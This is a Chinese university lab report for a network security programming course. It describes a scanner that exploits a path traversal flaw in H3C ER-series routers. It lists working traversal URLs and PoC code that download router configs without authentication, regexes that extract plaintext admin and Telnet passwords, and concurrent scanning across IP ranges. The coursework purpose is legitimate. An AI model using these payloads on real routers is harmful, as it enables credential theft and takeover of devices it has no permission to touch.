# 《网络安全编程》考查实验报告

---

## 一、基本信息

| 项目 | 内容 |
|------|------|
| **项目名称** | H3C 路由器配置泄露检测工具 |
| **项目英文名** | H3C Router Security Scanner v1.0 |
| **适用课程** | 网络安全编程 |
| **适用专业** | 网络空间安全 |
| **开发工具** | Python 3 + PyQt5 + AI 辅助开发 |
| **源码位置** | `A:\Download\H3C-router\` |

---

## 二、项目概述

### 2.1 项目背景

H3C ER8300G2-X 等路由器存在路径穿越漏洞（CVE 未分配），攻击者可通过特殊构造的 URL 路径绕过权限验证，直接获取路由器完整配置文件。配置文件中明文存储了 Web 管理密码（`admpwd`）和 Telnet 远程登录密码（`vtypasswd`）等敏感信息，可能导致设备被完全控制。

### 2.2 项目目标

设计并实现一款图形化的 H3C 路由器配置泄露检测工具，具备以下核心能力：

1. 多目标并发扫描
2. 路径穿越漏洞检测与利用
3. 配置文件敏感信息自动提取
4. 弱口令验证
5. 结果导出与可视化展示

### 2.3 漏洞原理

利用路径穿越漏洞访问以下 URL 获取路由器配置文件：

```
/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
```

该 URL 利用 `../` 路径穿越绕过身份验证，直接下载未授权的配置文件。

---

## 三、功能模块实现与技术细节

### 3.1 UI 界面（15分）

| 评分项 | 分值 | 实现说明 |
|--------|------|----------|
| 美观性与专业性 | 8分 | Catppuccin Mocha 暗色主题（#1e1e2e 底色），高对比度配色，Consolas 等宽字体，安全工具专业风格 |
| 交互逻辑 | 7分 | 参数配置 → 扫描控制 → 进度显示 → 结果表格 → 导出，操作路径清晰；表头点击排序增强交互 |

**核心 UI 组件：**
- `QMainWindow` 主窗口，标题 `H3CRouterSecurityScannerv1.o|路由器配置泄露检测工具`
- `QGroupBox` 参数配置区（目标、端口、线程、超时）
- `QTableWidget` 结果表格（7 列：状态、目标、端口、指纹、漏洞类型、敏感信息、详情）
- `QPlainTextEdit` 日志输出区（最大 1000 行，自动滚动）
- `QProgressBar` 进度条
- `QPushButton` 控制按钮组（开始/停止/清空/导出 CSV/导出 TXT）
- `QSplitter` 上下分区（结果表格 + 日志）

**暗色主题样式（DARK_STYLE）：**
```css
QMainWindow { background-color: #1e1e2e; }
QPushButton#btnSuccess { background-color: #a6e3a1; color: #1e1e2e; }
QPushButton#btnDanger { background-color: #f38ba8; }
QTableWidget { gridline-color: #313244; }
QProgressBar::chunk { background-color: #89b4fa; }
```

### 3.2 程序主框架（15分）

| 评分项 | 分值 | 实现说明 |
|--------|------|----------|
| 可扩展性 | 8分 | 模块化设计：`main.py`(UI) / `core.py`(引擎) / `config.py`(配置) / `pocs/`(漏洞插件) / `utils/`(工具) |
| 错误处理 | 7分 | try/except 全覆盖 + `RotatingFileHandler` 日志 + 线程安全日志回调 |

**模块职责分离：**
```
H3C-router/
├── main.py          # PyQt5 入口，UI 布局，信号/槽绑定
├── core.py          # ScanEngine 多线程引擎 + FingerprintScanner
├── config.py        # Rule 规则类 + 配置加载 + 指纹加载
├── pocs/            # PoC 插件系统（自动发现 + 基类继承）
├── utils/           # 通用工具（IP解析/敏感提取/日志/导出）
```

**异常处理机制：**
- 网络请求异常 → 捕获并记录 debug 日志，不中断扫描
- 配置文件解析异常 → 回退默认规则
- 线程池异常 → `future.result()` 异常捕获，继续处理其余任务
- 导出异常 → 弹窗提示 + 日志记录
- 关闭事件 → 信号断开 + 线程终止确认弹窗

### 3.3 功能模块（40分）

| 评分项 | 分值 | 实现说明 |
|--------|------|----------|
| 覆盖广度 | 20分 | H3C 指纹识别 + 路径穿越检测 + 敏感信息提取 + 弱口令验证 + 多格式目标解析 |
| 检测精度 | 20分 | 原始 Socket 请求 + 精确正则匹配 + 漏洞 PoC 验证 + 指纹多关键词匹配 |

#### 3.3.1 H3C 设备指纹识别

基于 `finger.json` 指纹数据库，通过 HTTP 响应体/响应头的关键词匹配识别设备。

**指纹匹配器 `FingerprintScanner`：**
```python
class FingerprintScanner:
    def __init__(self):
        self.fingerprints = load_fingerprints()

    def scan(self, target_data: dict) -> dict:
        # 根据 location (body/header/url) 匹配关键词
        for keyword in keywords:
            if keyword and keyword.lower() in content.lower():
                result["cms"] = cms         # 如 "H3C ER8300G2-X"
                result["confidence"] = 100
                return result
```

#### 3.3.2 配置泄露检测（核心 PoC）

**`pocs/h3c_config_leak.py`** 实现了路径穿越利用：

```python
def check(self) -> Dict[str, Any]:
    # 尝试多个路径穿越 payload
    payloads = [
        "/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg",
        "/userLogin.asp/../actionpolicy_status/../ER5200G2.cfg",
        "/../actionpolicy_status/../ER8300G2-X.cfg",
        "/userLogin.asp/../ER8300G2-X.cfg",
    ]
    for path in payloads:
        resp = self.get(path)  # 原始 Socket GET
        if resp and resp.status_code == 200:
            # 检测是否为 cfg 配置文件（包含关键词）
            if self._is_config_file(resp.text):
                sensitive = extract_sensitive_info(resp.text)
                return self._build_result(
                    vulnerable=True, type_="H3C 配置泄露",
                    detail=f"利用路径: {path}\n{敏感信息格式化}",
                    sensitive_info=sensitive,
                    fingerprint=self._identify_model(resp.text),
                )
```

#### 3.3.3 敏感信息自动提取

**`utils/common.py` 中的 `extract_sensitive_info()`** 使用 24 条正则规则从配置文本中提取：

```python
patterns = {
    "admpwd":      [r'admpwd\s*=\s*"?([^"\s]+)', ...],
    "vtypasswd":   [r'vtypasswd\s*=\s*"?([^"\s]+)', ...],
    "model":       [r'(ER\d+[\w-]*)/[\w\d]+', ...],
    "version":     [r'ER\d+[\w-]*/([\w\d]+)', ...],
    "passwd":      [r'^\s*passwd\s*=\s*"?([^"\s]*)'],
    "admpwdpromt": [r'admpwdpromt\s*=\s*"?([^"\s]+)'],
    "ntp_server":  [r'ntp_server\s*=\s*"?([^"\s]+)'],
    "dhcp_server": [r'dhcp_server\s*=\s*"?([^"\s]+)'],
    # ... 共 16+ 个字段
}
```

#### 3.3.4 PoC 自动发现机制

**`pocs/__init__.py`** 使用 `pkgutil.iter_modules` 自动扫描 `pocs/` 目录：

```python
def discover_pocs() -> Dict[str, Type[PoCBase]]:
    for importer, modname, ispkg in pkgutil.iter_modules([pocs_dir]):
        if modname in ("__init__", "base"):
            continue
        module = importlib.import_module(f"pocs.{modname}")
        for name, obj in inspect.getmembers(module):
            if inspect.isclass(obj) and issubclass(obj, PoCBase) and obj is not PoCBase:
                _discovered_pocs[name] = obj  # 自动注册
```

新的 PoC 只需继承 `PoCBase` 并放在 `pocs/` 目录下即可自动加载。

#### 3.3.5 目标解析引擎

支持 5 种格式：
- 单个 IP：`192.168.1.1`
- 逗号分隔：`192.168.1.1,192.168.1.2`
- CIDR 网段：`192.168.1.0/24`
- 范围：`192.168.1.1-100`
- 域名解析：`example.com`
- TXT 文件导入（每行一个 IP）

#### 3.3.6 结果导出

- **CSV 导出**：UTF-8 BOM 编码，Excel 兼容，包含 9 列（目标、端口、脆弱、漏洞类型、指纹、Web密码、Telnet密码、设备型号、详情）
- **TXT 导出**：格式化文本报告，包含统计信息和详细结果
- **表格排序**：点击"状态"列表头切换脆弱优先/原始顺序（仅 UI 层面，不影响导出）

### 3.4 多线程模块（20分）

| 评分项 | 分值 | 实现说明 |
|--------|------|----------|
| 并发控制 | 20分 | `ThreadPoolExecutor` 动态线程池 + `threading.Event` 停止标志 + 线程安全日志 |

**`ScanEngine` 核心实现：**

```python
class ScanEngine:
    def start_scan(self, target_input, ports, threads, timeout, poc_names):
        # 解析目标，生成 (ip, port, poc_name) 任务列表
        tasks = [(ip, port, poc_name) for ... for ...]

        # 动态线程池执行
        self._executor = ThreadPoolExecutor(max_workers=threads)
        futures = {
            self._executor.submit(self._run_poc, ip, port, poc_name, timeout)
            for ip, port, poc_name in tasks
        }

        # 并发收集结果
        for future in as_completed(futures):
            if self._stop_flag.is_set():
                break
            # 线程安全结果写入（Lock）+ 回调通知 UI
```

**线程安全设计：**

| 机制 | 实现 |
|------|------|
| 结果列表 | `threading.Lock()` 保护写入 |
| 停止标志 | `threading.Event()` 线程安全信号 |
| 进度回调 | 通过 `pyqtSignal` 跨线程发射 |
| 日志回调 | 通过 `pyqtSignal` 保证 UI 线程安全更新 |
| 线程池 | `ThreadPoolExecutor` 动态管理，支持 `shutdown(wait=False, cancel_futures=True)` |

**`ScanWorker`（QThread 包装）：**
```python
class ScanWorker(QThread):
    progress_updated = pyqtSignal(int, int)
    result_found = pyqtSignal(dict)
    scan_finished = pyqtSignal()
    log_message = pyqtSignal(str, str)
    scan_log = pyqtSignal(str)
```

### 3.5 个人创新（10分）

| 评分项 | 分值 | 实现说明 |
|--------|------|----------|
| 技术突破 | 5分 | 原始 Socket 级 HTTP 请求（无第三方依赖），绕过 SSL 证书验证；PoC 插件自动发现机制 |
| 特色功能 | 5分 | 配置文件敏感信息自动提取（16+ 字段正则匹配）；结果表格状态列点击排序 |

#### 创新点详解

1. **原始 Socket 层 HTTP 请求**：`PoCBase.get()` / `PoCBase.post()` 使用 `socket` + `ssl` 标准库实现，不依赖 `requests`，避免第三方库兼容问题，且更接近协议底层，便于调试和定制。

2. **PoC 自动发现系统**：基于 `pkgutil.iter_modules` + `inspect.getmembers` 自动注册，新增 PoC 只需创建文件继承 `PoCBase`，无需修改任何注册代码。

3. **覆盖 16+ 配置字段的正则提取引擎**：从 `admpwd`、`vtypasswd` 到 `admpwdpromt`（密码找回提示）、`vtyauthmode`（认证模式）、`admappwdtype`（密码类型）等，全面还原路由器安全配置状态。

4. **结果表格交互式排序**：点击"状态"列标题可在"脆弱优先"和"原始顺序"间切换，排序仅在 UI 层进行，不影响 `self.results` 数据列表和导出文件的顺序。

5. **线程安全的日志系统**：双重日志通道——`RotatingFileHandler` 文件日志（10MB 滚动） + `pyqtSignal` 跨线程 UI 日志，彩色控制台输出。

---

## 四、运行说明

### 4.1 环境要求

- Python >= 3.8
- 操作系统：Windows 10/11（支持 Linux、macOS）

### 4.2 安装依赖

```bash
cd A:\Download\H3C-router
pip install -r requirements.txt
```

### 4.3 启动程序

```bash
python main.py
```

### 4.4 使用流程

1. 输入目标（支持 IP/CIDR/范围/域名/TXT 文件）
2. 配置扫描端口（默认 `8081,10001,8090`）
3. 设置线程数（建议 10-50）
4. 点击"开始扫描"
5. 实时查看进度、日志和结果
6. 点击"状态"列表头排序
7. 点击"导出 CSV/TXT"保存报告

---

## 五、收获体会

通过本项目的开发，我深入理解了网络安全编程从理论到实践的完整流程。以下是我的主要收获：

**第一，对漏洞原理的深入理解。** 本项目针对 H3C 路由器的路径穿越漏洞，从漏洞原理分析、PoC 构建到敏感信息提取，完整地实践了漏洞利用的全过程。路径穿越漏洞虽然原理简单，但在实际环境中危害巨大——仅通过简单的 `../` 序列就能绕过认证获取完整配置文件。这让我深刻认识到 Web 安全中"输入验证"的重要性，权限校验绝不能依赖 URL 路径的不可遍历性。

**第二，多线程编程的工程实践。** 使用 `ThreadPoolExecutor` 实现动态线程池管理，结合 `threading.Event` 实现优雅停止。在处理线程安全问题时，我遇到了 UI 线程与工作线程的通信难题，通过 `pyqtSignal` 跨线程信号机制完美解决。线程池的 `cancel_futures=True` 参数在 Python 3.9+ 中支持取消未启动的任务，这对于大规模扫描场景非常关键。

**第三，模块化设计的价值。** 将程序拆分为 `main.py`（UI）、`core.py`（引擎）、`pocs/`（插件）、`utils/`（工具）等模块，使得代码结构清晰、职责单一。特别是 PoC 自动发现机制，新增漏洞检测只需创建文件并继承基类，无需修改框架代码，这体现了"开闭原则"的工程实践。

**第四，AI 辅助开发的效率提升。** 利用 AI 工具辅助编写正则表达式、设计 UI 布局、调试线程安全问题，显著提高了开发效率。AI 在代码审查、Bug 定位和样式设计方面提供了极大帮助，但核心的架构设计、安全逻辑仍需开发者自主完成。

**第五，安全工具开发的伦理思考。** 开发过程中我查阅了《网络安全法》相关规定，明确了安全检测工具的合法使用边界。本工具仅用于授权的安全评估，不得用于非法入侵。安全是一把双刃剑，开发者应当具备职业道德和法律意识。

**建议：** 希望课程能增加更多真实漏洞环境的实战环节，如使用 Docker 搭建靶机环境进行漏洞验证。同时，建议引入 CI/CD 持续集成概念，让学生体验从代码提交到自动测试的完整开发流程。

---

## 六、参考文献

1. H3C ER8300G2-X 产品文档，新华三技术有限公司
2. OWASP Path Traversal, https://owasp.org/www-community/attacks/Path_Traversal
3. Python `concurrent.futures` 官方文档, https://docs.python.org/3/library/concurrent.futures.html
4. PyQt5 官方文档, https://www.riverbankcomputing.com/static/Docs/PyQt5/
5. Catppuccin 配色方案, https://catppuccin.com/
